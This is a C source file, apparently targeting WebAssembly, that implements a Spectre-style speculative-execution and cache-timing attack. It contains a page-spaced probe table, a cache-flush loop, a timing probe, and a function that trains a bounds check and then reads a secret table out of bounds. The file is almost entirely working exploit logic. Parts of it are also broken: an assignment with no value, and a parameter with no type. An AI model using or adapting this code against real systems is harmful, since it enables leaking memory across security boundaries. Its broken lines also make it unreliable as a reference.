extern void startTimer();
extern unsigned stopTimer();
extern void log(unsigned);

const unsigned PAGE_SIZE = 1 << 12;
const unsigned BYTE_LENGTH = sizeof(char) * (1 << 8);
const unsigned PROBE_LENGTH = PAGE_SIZE * BYTE_LENGTH;

unsigned char probe_table[PROBE_LENGTH];
unsigned char length_table[PROBE_LENGTH];
unsigned char secret_table[PROBE_LENGTH];

const unsigned CACHE_SIZE = 4 * (1 << 20);
const unsigned CACHE_LINE_SIZE = 64;
const unsigned FLUSH_ARRAY_LENGTH = CACHE_SIZE / (BYTE_LENGTH * sizeof(unsigned));
unsigned flush_array[FLUSH_ARRAY_LENGTH];

unsigned time_table[BYTE_LENGTH];
unsigned char junk = 0;

const unsigned probeTable() {

    // log(1001);
    for (unsigned i = 0; i < BYTE_LENGTH; ++i) {
        // log(1002);
        unsigned probe_index = i * PAGE_SIZE;
        startTimer();
        // access the probe table
        junk ^= probe_table[probe_index];
        time_table[i] = stopTimer();
    }
    unsigned zero_counter = 0;
    unsigned min_index = 0 & junk;
    unsigned min_value = 0xffffffff;
    for (unsigned i = 0; i < BYTE_LENGTH; ++i) {
        const unsigned value = time_table[i];
        zero_counter += value == 0;
        // log(value);
        if (value < min_value) {
            min_value = value;
            min_index = i;
        }
    }
    if (zero_counter > 1) {
        return -1;
    }
    return min_index;
}

unsigned char flushCache() {
    for (unsigned i = 0; i < FLUSH_ARRAY_LENGTH; i += CACHE_LINE_SIZE) {
        junk ^= flush_array[i];
    }
    return junk;
}

int initialize() {
    // write probe length in the length part of the heap
    for (unsigned i = 0; i < PROBE_LENGTH; i += PAGE_SIZE) {
        length_table[i] = ;
    }
    return 0;
}


void speculativelyAccessAddress(address) {
    // if address < 256 -> valid address (for training)
    // else invalid address for secret extraction
    static unsigned char length_address = 0;
    // fetch the length from length_table from RAM to trigger speculative execution
    if (address < length_table[length_address++ * PAGE_SIZE] * 256) {
        // make request to probe_table at the index that corresponds with the value of secret_table[address]
        junk ^= probe_table[secret_table[address] * PAGE_SIZE];
    }
}

// export static information
const unsigned getPageSize() {
    return PAGE_SIZE;
}

const unsigned getProbeLength() {
    return PROBE_LENGTH;
}

unsigned char * getProbeAddress() {
    return probe_table;
}

unsigned char * getSecretAddress() {
    return secret_table;
}

unsigned reload(unsigned char probe_index) {
    // test
    flushCache();
    const unsigned char junk = probe_table[probe_index * PAGE_SIZE];
    return probeTable() | junk;
}